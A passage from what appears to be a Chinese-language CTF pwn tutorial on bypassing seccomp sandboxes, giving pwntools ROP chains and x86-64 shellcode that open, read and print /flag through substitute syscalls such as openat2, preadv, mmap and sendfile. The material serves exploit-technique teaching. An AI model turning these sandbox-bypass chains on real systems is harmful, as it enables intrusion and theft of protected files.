<span class="nf">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="sh">'</span><span class="s">linux</span><span class="sh">'</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="n">p</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span><span class="n">t</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\033</span><span class="s">[0;31;43m</span><span class="si">{</span><span class="n">s</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">-------------------------&gt;</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">hex</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="si">}</span><span class="se">\033</span><span class="s">[0m</span><span class="sh">"</span><span class="p">)</span>

<span class="n">sh</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./shellcode</span><span class="sh">"</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="p">[</span><span class="n">shellcode代码</span><span class="p">]</span> <span class="c1">#-----------
</span><span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>

<span class="n">sh</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h3 id="沙盒">沙盒</h3>

<p>沙盒是一种对程序的保护，他可以禁用一些系统调用从而增加pwn题目的难度，迫使pwner们通过ORW的方法进行绕过沙盒。比如最常见的禁用execve，那么就只能通过open，read，write来直接读取flag的内容。</p>

<h3 id="沙盒检测">沙盒检测</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>seccomp-tools dump ./pwn
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="正篇">正篇</h2>

<h3 id="openreadwrite">open+read+write</h3>

<h4 id="rop">rop</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">_IO_list_all</span><span class="sh">"</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">])</span>  <span class="c1"># read
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">_IO_list_all</span><span class="sh">"</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">open</span><span class="sh">"</span><span class="p">])</span>  <span class="c1"># open
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">_IO_list_all</span><span class="sh">"</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">])</span>  <span class="c1"># read
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">_IO_list_all</span><span class="sh">"</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">write</span><span class="sh">"</span><span class="p">])</span>  <span class="c1"># write
</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="shellcode">shellcode</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nf">pushstr</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>
<span class="n">flag_name</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="sh">""</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s"> 
    mov r12,</span><span class="sh">"""</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="nf">u64</span><span class="p">(</span><span class="n">flag_name</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)))</span> <span class="o">+</span> <span class="sh">"""</span><span class="s">
    mov [rsp],r12
</span><span class="sh">"""</span>

<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    mov rax,2
    syscall
</span><span class="sh">"""</span>   <span class="c1"># open
</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall
</span><span class="sh">"""</span>   <span class="c1"># read
</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 1
    syscall
</span><span class="sh">"""</span>   <span class="c1"># write
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="open替代">open替代</h3>

<h4 id="openat">openat</h4>

<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">_IO_list_all</span><span class="sh">"</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">openat</span><span class="sh">"</span><span class="p">])</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">openat</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>


<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
mov rdi, -100 #mov rdi, 3也可以，但是不通用，要是fd=3所指的目录
mov rsi, rsp
mov rdx, 0
mov r10, 0
mov rax,0x101
syscall
</span><span class="sh">"""</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h4 id="openat2">openat2</h4>

<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x000000000404020</span> <span class="c1"># 写bss段
</span><span class="n">exec_fd</span> <span class="o">=</span> <span class="p">(</span><span class="n">bss_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
<span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x18</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">mprotect</span><span class="sh">"</span><span class="p">])</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">],</span> <span class="n">exec_fd</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">([</span><span class="n">shellcode</span><span class="p">])</span> <span class="c1"># 填写shellcode
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
mov r12, 0x0067616c66
mov [rsp], r12

xor rax, rax
push rax
push rax
push rax
push rax

mov rdi, -100       
lea rsi, [rsp+0x20]  
mov rdx, rsp         
mov r10, 0x18        
mov rax, 437        
syscall
mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 0x100
mov rax, 0x28
syscall
</span><span class="sh">'''</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h3 id="read替代">read替代</h3>

<h4 id="pread">pread</h4>

<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">_IO_list_all</span><span class="sh">"</span><span class="p">]</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rcx</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">pread</span><span class="sh">"</span><span class="p">])</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">pread</span><span class="p">(</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>


<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
mov rdi, 3
mov rsi, rsp
mov rdx, 0x100
mov r10, 0
mov rax, 0x11
syscall
</span><span class="sh">"""</span>   <span class="c1"># read
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h4 id="readv">readv</h4>

<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x000000000404020</span> <span class="c1"># 写bss段
</span><span class="n">exec_fd</span> <span class="o">=</span> <span class="p">(</span><span class="n">bss_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
<span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x18</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">mprotect</span><span class="sh">"</span><span class="p">])</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">],</span> <span class="n">exec_fd</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">([</span><span class="n">shellcode</span><span class="p">])</span> <span class="c1"># 填写shellcode
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">'''</span><span class="s">
push 0x200
push 0x200
mov [rsp],rsp
</span><span class="sh">'''</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">readv</span><span class="p">(</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>


<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
push 0x200
push 0x200
mov [rsp],rsp
mov rdi, 3
mov rsi, rsp
mov rdx, 0x1
mov rax, 0x13
syscall
</span><span class="sh">"""</span>   <span class="c1"># read
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h4 id="preadv">preadv</h4>

<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x000000000404020</span> <span class="c1"># 写bss段
</span><span class="n">exec_fd</span> <span class="o">=</span> <span class="p">(</span><span class="n">bss_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
<span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x18</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">mprotect</span><span class="sh">"</span><span class="p">])</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">],</span> <span class="n">exec_fd</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">([</span><span class="n">shellcode</span><span class="p">])</span> <span class="c1"># 填写shellcode
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">'''</span><span class="s">
push 0x200
push 0x200
mov [rsp],rsp
</span><span class="sh">'''</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">preadv</span><span class="p">(</span><span class="sh">'</span><span class="s">rax</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">rsp</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
push 0x200
push 0x200
mov [rsp],rsp
mov rdi, 3
mov rsi, rsp
mov rdx, 0x1
mov r10, 0
mov rax, 0x127
syscall
</span><span class="sh">"""</span>   <span class="c1"># read
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h4 id="mmap">mmap</h4>

<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x000000000404020</span> <span class="c1"># 写bss段
</span><span class="n">exec_fd</span> <span class="o">=</span> <span class="p">(</span><span class="n">bss_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
<span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span> <span class="o">*</span> <span class="mh">0x18</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">mprotect</span><span class="sh">"</span><span class="p">])</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="n">exec_fd</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">],</span> <span class="n">exec_fd</span><span class="p">)</span>

<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sh</span><span class="p">.</span><span class="nf">sendline</span><span class="p">([</span><span class="n">shellcode</span><span class="p">])</span> <span class="c1"># 填写shellcode
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="c1"># 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">mmap</span><span class="p">(</span><span class="mh">0x777721000</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>


<span class="c1"># 主要mmap映射到了0x777721000，所以之后的write也需要输出0x777721000位置的内容。
</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
mov rdi, 0x777721000
mov rsi, 0x100
mov rdx, 1
mov r10, 2
mov r8, 3
mov r9, 0
mov rax, 9
syscall
</span><span class="sh">"""</span>   <span class="c1"># read
</span></pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h4 id="sendfile">sendfile</h4>

<p><strong>sendfile可以直接代替write与read</strong></p>

<blockquote>
  <p><strong>rop</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">rop</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">pop_rdx_r12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">pop_rcx</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">sendfile</span><span class="sh">"</span><span class="p">])</span>
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<blockquote>
  <p><strong>shellcode</strong></p>

  <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">sendfile</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">rax</span><span class="sh">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>


<span class="n">shellcode</span> <span class="o">+=</span> <span class="sh">"""</span><span class="s">
mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 0x100
mov rax, 0x28
syscall
</span><span class="sh">"""</span> 
</pre></td></tr></tbody></table></code></pre></div>  </div>
</blockquote>

<h3 id="write替代">write替代</h3>

<h4 id="writev">writev</h4>

